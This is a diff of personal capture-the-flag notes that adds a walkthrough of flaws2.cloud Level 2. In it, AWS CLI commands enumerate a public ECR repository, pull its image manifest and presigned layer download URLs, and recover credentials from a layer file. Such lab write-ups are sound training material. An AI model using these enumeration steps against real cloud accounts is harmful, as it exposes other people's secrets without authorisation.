@@ -820,7 +820,7 @@ This was pretty fun, barely any setup needed and great for someone starting out.
 
 ## flaws2.cloud (attacker path)
 
-## Level 1
+### Level 1
 
 Seems to start off as a web challenge, cool! Let's fire up burp
 
@@ -865,8 +865,83 @@ They are! So let's try to list what's inside the bucket
 
 Curling or using a browser to fetch the secret HTML reveals Level 2 at http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud.
 
-## Level 2
+### Level 2
+```
+This next level is running as a container at http://container.target.flaws2.cloud/. Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2".
+```
 
+If an ECR is public, we can list its images. For that we need the repository name and the registry id
+```
+┌──(kali㉿kali)-[~]
+└─$ aws sts get-caller-identity
+{
+    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
+    "Account": "653711331788",
+    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
+}
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ aws ecr list-images --repository-name level2 --registry-id 653711331788
+{
+    "imageIds": [
+        {
+            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
+            "imageTag": "latest"
+        }
+    ]
+}
+```
+We can enumerate further by fetching the manifest of this container with
+```
+┌──(kali㉿kali)-[~]
+└─$ aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'
+
+{
+  "schemaVersion": 2,
+  "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+  "config": {
+    "mediaType": "application/vnd.docker.container.image.v1+json",
+    "size": 5359,
+    "digest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
+  },
+  "layers": [
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 43412182,
+      "digest": "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"
+    },
+    {
+      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
+      "size": 848,
+      "digest": "sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49"
+    },
+<snip>
+```
+We  can request a download URL for each layer with the following command. This requires some trial and error until we find something useful
+
+```
+┌──(kali㉿kali)-[~]
+└─$ aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
+
+{
+    "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.us-east-1.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/1e964f10-a061-4e7b-9290-4447e821fe9a?rid=58b3a0a8-1806-5777-1315-c2d788e36c12&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQDxq1BlXLjU2Y9W7MHIgMsl0ksBT2ZV35qpzk%2BYDLiqRAIhANXG3788LS%2F%2BdIwkChtkbKj8f0JScpBKMCxHp5XhNalqKr8DCFwQBRoMNTkxMTA1OTE0OTUyIgwaxuyOPqWg243BMmMqnAOxaw3PNDqaTPHUT08fGqlw4FLCi0zj3KLwpNE3hpblb06FJH3fNjQAufUVUig%2Bo3EqDLMTJhUCZluA6cMSgGvKCUBMV6HlNwp4qlf2sCH28IzF4Gk%2BcxsiSsyBMEClyVOO3MG%2B2HwM5VXi6WY1pnPK7B5jwdneMaQ0F1V7XDpa0SgfdWyezzlBq9YKJzu%2FDFKLMikJX6UPfn58wWERZjiUThqvbJBVLx8Mxfi9LOUt8mJKQ5CDmhyNFXYgVPXzEWlBxCw8bySt9Au9gpn%2BV3LNuTNcd5sI3zXioTqyLKki9gWBkxvkxRIkRnGmwSjr522DDVrUX1elhV7C6fGwib8%2Fb01XfEQgqFnlUbBREV7Woltep2VODwx4WqVdEcUBHCuK33LY6NDU4Wjo5aaOewEtuWqch7wG9VWb6T0fZjCpXdZqXpScQJl3dEuMrZ2zX9mxWxG22PhrerAFCOFoN8r23ny68TNoOgD%2FwXq7glhJg8veJku2Kl79IQ7CE16MTtIX9Ma%2BjkuBsd3VMnp1SJCtYXFCMWSXG82epxCPMOXIuMcGOqABCsoj%2FMOQKSJ9Awiw%2FL1AShhj5WlUhRDnR%2FCbTDya2T6gH0yc16gk3Et%2BFoAIYe5P538tsWExVhkebn%2FvJNMxnA8%2Bm0hAZy%2FuKDl1itSnXLHnsIgiLCbHbQk3%2F5DC20WzAwDYw6xRRPz7OcJsVhFCXAvJKtXHpLRx8m%2FUrx%2FpPpcEDR3bh1%2FgJUtnZwKFJzrNZLheH17hJGtK1mHKqodjnw%3D%3D&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Date=20251014T104839Z&X-Amz-SignedHeaders=host&X-Amz-Expires=3600&X-Amz-Credential=ASIAYTIFIPBEIVU7JJMK%2F20251014%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Signature=64397e61611082a5c2c251300ba2d8b682e77bce2007613b58ae5887f4421b3f",
+    "layerDigest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
+}
+```
+Browsing to the URL will download file which contains credentials
+
+<p align="center">
+  <img width="50%" src="https://github.com/user-attachments/assets/ef3ee4e6-8694-4ed0-8cac-ad2066161878" >
+</p>
+
+These creds work in the initial login form, and we find Level 3 at http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/
+
+
+### Level 3
+
+```
+The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com
+```
 
 
 
@@ -874,7 +949,7 @@ Curling or using a browser to fetch the secret HTML reveals Level 2 at http://le
 
 ## pwnedlabs.io
 
-Most stuff here is paid, but the free labs are pretty good, I'd definitely recommend them. I filtered by Red Team, AWS and Free and completed them all. It goes a bit more in-depth than both flaws.cloud and covers some other service-specific vulnerabilities, so go ahead and try them out! I'll still leave some notes for myself in this section.
+Most stuff here is paid, but the free labs are pretty good, I'd definitely recommend them. I filtered by Red Team, AWS and Free and completed them all. It goes a bit more in-depth than both flaws.cloud and covers some other service-specific vulnerabilities, so go ahead and try them out! Each lab has a thorough walkthrough so I won't bother with that, but I'll still leave some notes for myself in this section.
 
 tbd
 
